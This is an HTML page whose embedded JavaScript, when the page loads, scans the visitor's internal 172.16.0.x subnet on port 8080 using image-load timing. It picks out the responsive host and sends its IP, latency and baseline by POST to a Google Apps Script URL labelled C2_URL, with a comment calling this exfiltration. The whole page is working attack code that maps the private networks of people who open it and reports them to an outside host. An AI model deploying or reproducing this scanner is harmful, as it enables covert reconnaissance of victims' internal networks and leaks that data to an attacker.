<!DOCTYPE html>
<html>
<head>
    <title>Adaptive Anomaly Hunter</title>
    <style>
        body { background: #000; color: #0f0; font-family: monospace; padding: 20px; }
        .success { border: 2px solid #0f0; padding: 15px; margin: 20px 0; background: #001100; }
        .stat-box { border-bottom: 1px solid #333; padding-bottom: 5px; margin-bottom: 10px; color: #888; }
        .highlight { color: #fff; font-weight: bold; }
    </style>
</head>
<body>
    <h1>// ADAPTIVE ANOMALY HUNTER //</h1>
    
    <div class="stat-box">
        <div>STATUS: <span id="status" class="highlight">Initializing...</span></div>
        <div>BASELINE (MEDIAN): <span id="median">Calculating...</span></div>
        <div>SCAN PROGRESS: <span id="progress">0/254</span></div>
    </div>

    <div id="results"></div>

    <script>
        // --- CONFIGURATION ---
        var C2_URL = "https://script.google.com/macros/s/AKfycbwWQQRwwAJ84yYCT6ykZpDCzTKsy0ZVom4_tDxSumkrFyhzXWpTR9er6b9k9auDkeTA/exec"; 
        var TARGET_PORT = 8080;
        var TIMEOUT_LIMIT = 200; // 200ms is plenty for LAN. Anything slower is "Dead".
        var CONCURRENCY = 10;    // Reduced to prevent browser queue clogging

        // --- STATE ---
        var results = []; 
        var queue = [];
        for(var i=1; i<255; i++) queue.push(i);

        // --- MATH ENGINE ---
        function calculateMedian(values) {
            if(values.length === 0) return 0;
            values.sort((a,b) => a-b);
            var half = Math.floor(values.length / 2);
            return values[half];
        }

        function analyzeAndReport() {
            // 1. Establish Baseline (The "Dead" IPs)
            // In your env, most IPs will equal TIMEOUT_LIMIT (200ms)
            var times = results.map(r => r.time);
            var median = calculateMedian(times);
            
            document.getElementById('median').innerText = median + "ms";
            document.getElementById('status').innerText = "Analyzing Deviations...";

            // 2. Find the Anomaly
            // Logic: The real target is FAST (~5ms). The dead IPs are SLOW (200ms).
            // We look for latencies significantly LOWER than the median.
            var anomaly = results.find(r => (median - r.time) > 100); 

            if(anomaly) {
                var msg = "TARGET CONFIRMED: 172.16.0." + anomaly.octet;
                var details = "Response: " + anomaly.time + "ms (Deviation: " + (median - anomaly.time) + "ms)";
                
                document.getElementById('results').innerHTML = 
                    "<div class='success'><h2>" + msg + "</h2><p>" + details + "</p></div>";

                // Exfil to Drive
                fetch(C2_URL, {
                    method: "POST", mode: "no-cors",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        timestamp: new Date().toISOString(),
                        type: "ANOMALY_CONFIRMED",
                        target_ip: "172.16.0." + anomaly.octet,
                        latency: anomaly.time,
                        baseline: median
                    })
                });
            } else {
                document.getElementById('status').innerText = "SCAN COMPLETE. NO ANOMALIES FOUND.";
            }
        }

        // --- PROBE ENGINE ---
        function scan(octet) {
            return new Promise(resolve => {
                var ip = "172.16.0." + octet;
                var start = performance.now();
                var img = new Image();
                var isDone = false;

                var finish = function() {
                    if(isDone) return;
                    isDone = true;
                    var duration = Math.round(performance.now() - start);
                    results.push({octet: octet, time: duration});
                    
                    document.getElementById('progress').innerText = results.length + "/254";
                    resolve();
                };

                img.onload = finish;
                img.onerror = finish; // Target (.181) triggers this in ~5ms

                // HARD STOP at 200ms. 
                // This clears the browser queue for the next batch.
                setTimeout(function() {
                    if(!isDone) {
                        img.src = ""; // Force kill connection
                        // Log as max timeout
                        results.push({octet: octet, time: TIMEOUT_LIMIT});
                        isDone = true;
                        document.getElementById('progress').innerText = results.length + "/254";
                        resolve();
                    }
                }, TIMEOUT_LIMIT);

                img.src = "http://" + ip + ":" + TARGET_PORT + "/favicon.ico?r=" + Math.random();
            });
        }

        // --- BATCH PROCESSOR ---
        async function runBatch() {
            while(queue.length > 0) {
                var batch = [];
                // Only fire 'CONCURRENCY' amount at once
                for(var i=0; i<CONCURRENCY && queue.length > 0; i++) {
                    batch.push(scan(queue.shift()));
                }
                await Promise.all(batch);
            }
            analyzeAndReport();
        }

        document.getElementById('status').innerText = "Scanning Subnet (Batch Size: " + CONCURRENCY + ")...";
        runBatch();

    </script>
</body>
</html>
